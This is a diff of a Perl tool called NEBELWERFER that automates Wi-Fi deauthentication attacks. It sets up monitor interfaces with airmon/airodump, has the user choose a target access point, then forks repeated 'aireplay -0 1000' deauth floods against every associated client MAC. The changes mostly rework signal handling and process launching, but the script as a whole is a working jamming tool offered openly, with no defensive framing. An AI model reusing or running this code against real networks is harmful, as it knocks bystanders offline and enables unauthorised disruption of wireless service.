@@ -16,7 +16,7 @@
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 #
 
-# Rev1, 20121028
+# Rev2, 20121029
 # alpha build!
 
 #-------------------------------------------------------------------------------
@@ -57,8 +57,10 @@
 	our $mon_index = 0;	
 	`rm $workdir/$fileprefix* -f`;
 	`rm $workdir/deauth* -f`;
+	our $time_to_die = 0;	
 
-	$SIG{INT}= $SIG{TERM} = \&term_handler;
+	$SIG{INT} = $SIG{TERM} = \&term_handler;
+	$SIG{CHLD} = "IGNORE";
 	
 	print YELLOW, BOLD;
 	print "NEBELWERFER\n";
@@ -75,6 +77,7 @@
 		print RED, BOLD, "Cannot create monitor interface, something is wrong!\n";
 		die "\n";
 	}
+	terminate_us() if ($time_to_die);
 		
 					# Search for the last interface that have
 					# been created
@@ -97,6 +100,7 @@
 					# time to let it capture enough packets
 	our $monitor_pid = start_monitor("mon$mon_index");
 	print YELLOW, BOLD, "Monitor script PID: $monitor_pid\n", RESET;
+	terminate_us() if ($time_to_die);	
 	
 	our %client_macs;		# Hash. Client_MAC => pid_of_deauth
 	
@@ -124,6 +128,7 @@
 		}
 		print "Enter the number of BSSID to choose: \n";
 		my $index = int(<>);
+		terminate_us() if ($time_to_die);		
 		
 		$bssid 		= $bssids->[$index - 1]->{bssid};
 		$channel 	= $bssids->[$index - 1]->{channel};
@@ -149,26 +154,27 @@
 					# wifi card can be only on one channel
 					# at a time
 	print YELLOW, BOLD, "Restarting monitor, fixing it at channel $channel\n";
-	kill "TERM", $monitor_pid;
+	kill "TERM", $monitor_pid;	
 
 					# Wait until it's really killed
 	usleep(100000) until (kill 0, $monitor_pid);
 	
 	$monitor_pid = start_monitor("mon$mon_index", $channel);
+	terminate_us() if ($time_to_die);	
 	
 	
 					# Create new monitor interface with 
 					# specified channel
 	print YELLOW, BOLD, "Creating another monitor interface...\n", RESET;
 	`$airmon start $interface $channel`;
+	terminate_us() if ($time_to_die);	
 	
 					# Get new monitor index
 	our ($aireplay_monindex) = `$ifconfig | grep mon | tail -1` =~ /mon(\d+)/ ;
 	print "For aireplay-ng we will use interface", YELLOW, BOLD, " mon$aireplay_monindex\n", RESET;
 	print "AP: $bssid on channel $channel\n";
 	
-	
-	do
+	until ($time_to_die)
 	{
 
 					# Grep clients that are associated with
@@ -225,8 +231,8 @@
 			print YELLOW, BOLD, "Restarted with pid $monitor_pid\n", RESET;
 		}
 	}
-	while (1);
-
+	
+	terminate_us();
 
 #-------------------------------------------------------------------------------
 # start_monitor(interface, channel)
@@ -238,24 +244,10 @@ sub start_monitor
 	my $mon_pid = fork();
 	if ($mon_pid == 0)
 	{
-
-					# It's the child, run airodump end exit					
-		open TESTSCR, ">", "$workdir/launchmon.sh" or die "Cannot create $workdir/launchmon.sh: $!\n";
-		print TESTSCR "#!/bin/sh
-				on_die()
-				{
-					kill -9 \$monitor_pid
-					exit 0
-				}
-
-				trap on_die TERM
-				$airodump ".($channel ? "$interface -c $channel" : "$interface")." -w $workdir/$fileprefix 2>/dev/null &
-				monitor_pid=\$!
-				wait \$monitor_pid
-			      ";
-		close TESTSCR;
-		chmod 0755, "$workdir/launchmon.sh";
-		exec "$workdir/launchmon.sh";
+		open STDOUT, ">", "/dev/null";
+		open STDERR, ">", "/dev/null";		
+		open STDIN, "<", "/dev/null";
+		exec "$airodump ".($channel ? "$interface -c $channel" : "$interface")." -w $workdir/$fileprefix";
 		exit 0;
 	}
 	
@@ -271,24 +263,13 @@ sub deauth_session
 {
 	my ($target_mac, $bssid) = (@_);
 
-	open TESTSCR, ">", "$workdir/deauth-$target_mac.sh" or die "Cannot create $workdir/deauth-$target_mac.sh: $!\n";
-	print TESTSCR "#!/bin/sh
-			on_die()
-			{
-				kill -9 \$deauth_pid
-				exit 0
-			}
-			
-			trap on_die TERM
-			$aireplay -0 1000 -a $bssid -c $target_mac mon$aireplay_monindex > $workdir/deauthlog-$target_mac.log
-			deauth_pid=\$!
-			wait \$deauth_pid";
-	close TESTSCR;
-	chmod 0755, "$workdir/deauth-$target_mac.sh";
 	my $deauth_pid = fork();
 	if ($deauth_pid == 0)
 	{
-		exec "$workdir/deauth-$target_mac.sh";
+		open STDOUT, ">", "$workdir/deauthlog-$target_mac.log";
+		open STDERR, ">", "$workdir/deauthlog-$target_mac.log";		
+		open STDIN, "<", "/dev/null";	
+		exec "$aireplay -0 1000 -a $bssid -c $target_mac mon$aireplay_monindex";
 		exit 0;	
 	}
 	
@@ -401,10 +382,10 @@ sub get_clients
 
 
 #-------------------------------------------------------------------------------
-# term_handler
-# Handles SIGKILL and SIGTERM signals
+# terminate_us
+# Cleans up
 #
-sub term_handler
+sub terminate_us
 {
 	print YELLOW, BOLD, "Caught termination signal, killing everything that moves!\n", RESET;
 	kill "TERM", $monitor_pid;
@@ -419,5 +400,16 @@ sub term_handler
 	print YELLOW, BOLD, "Stopping monitor interfaces...\n", RESET;
 	system "$airmon stop mon$mon_index";
 	system "$airmon stop mon$aireplay_monindex";
-	exit 0;
+	die "\n";
+}
+
+
+#-------------------------------------------------------------------------------
+# term_handler
+# Handles SIGKILL and SIGTERM signals
+#
+sub term_handler
+{
+	print RED, BOLD, "Caught termination signal, please wait and DO NOT TRY TO FORCE TERMINATION\n", RESET;
+	$time_to_die = 1;	
 }
